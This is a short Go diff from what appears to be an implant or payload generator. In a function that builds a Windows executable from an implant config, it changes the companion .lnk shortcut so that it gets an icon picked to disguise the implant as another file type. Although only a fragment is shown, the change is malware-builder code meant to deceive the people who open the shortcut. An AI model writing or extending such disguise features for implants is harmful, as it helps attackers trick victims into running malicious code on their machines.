@@ -133,7 +133,7 @@ func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 		lnkName := strings.TrimSuffix(exeName, ".exe")
 		lnkName = strings.TrimSuffix(lnkName, ".EXE") + ".lnk"
 		lnkPath := filepath.Join(outputDir, lnkName)
-		if data, err := BuildLnkForExe(exeName); err == nil {
+		if data, err := BuildLnkForExeWithIcon(exeName, DisguiseLnkIcon(cfg.DisguiseAs, exeName)); err == nil {
 			if err := os.WriteFile(lnkPath, data, 0644); err != nil {
 				fmt.Printf("lnk warning: failed to write %s: %v\n", lnkPath, err)
 				return outPath, nil
